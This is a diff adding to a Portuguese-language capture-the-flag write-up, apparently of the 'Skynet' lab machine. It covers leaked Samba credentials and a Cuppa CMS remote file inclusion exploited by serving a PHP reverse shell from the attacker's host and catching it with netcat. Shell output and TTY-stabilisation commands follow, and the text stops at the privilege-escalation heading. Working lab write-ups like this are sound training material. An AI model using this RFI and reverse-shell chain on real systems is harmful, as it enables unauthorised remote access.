@@ -38,4 +38,61 @@ gobuster dir -u [http://10.67.176.22](http://10.67.176.22) -w /usr/share/wordlis
 **Credenciais de E-mail:** `milesdyson : cyborg007haloterminator`
 
 Dentro da caixa de entrada, recuperei a senha do Samba em um e-mail de "Password Reset" e a localização de um diretório oculto.
+No webmail, encontrei um e-mail com o assunto "Samba Password reset" contendo a nova senha do Miles: `)s{A&2Z=F^n_E.B``.
+
+## 2. Acesso Inicial
+### 2.1 Invasão do Share Privado
+Com a senha em mãos, acessei os arquivos pessoais do Miles:
+```
+smbclient //10.67.176.22/milesdyson -U 'milesdyson%)s{A&2Z=F^n_E.B`'
+```
+Dentro da pasta notes, li o arquivo important.txt, que revelou um diretório oculto no servidor web utilizado para testes de um CMS beta: /45kra24zxs28v3yd.
+
+## 2.2 Exploração de RFI (Remote File Inclusion)
+O diretório oculto revelou o uso do Cuppa CMS. Pesquisei vulnerabilidades públicas para este sistema:
+```
+searchsploit cuppa
+```
+A falha reside no arquivo /administrator/alerts/alertConfigField.php, que permite a inclusão de arquivos remotos via parâmetro urlConfig.
+
+Execução do Reverse Shell:
+
+Clonei o shell PHP do Kali:
+```
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php (configurei-o com meu IP da VPN e porta 4444).
+```
+Subi um servidor Python:
+```
+python3 -m http.server 80.
+```
+Iniciei o Netcat:
+```
+nc -lvnp 4444.
+```
+Chamei o exploit via navegador:
+```
+http://10.67.176.22/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<SeuIP>/shell.php
+```
+No Netcat a conexão será estabelecida:
+
+```
+listening on [any] 4444 ...
+connect to [192.168.145.31] from (UNKNOWN) [10.67.176.22] 50392
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 18:02:54 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+Estabilização da Shell:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+Com isso é só buscar o arquivo do usuário e obter a primeira flag.
+
+## 3. Escalação de Privilégios
 
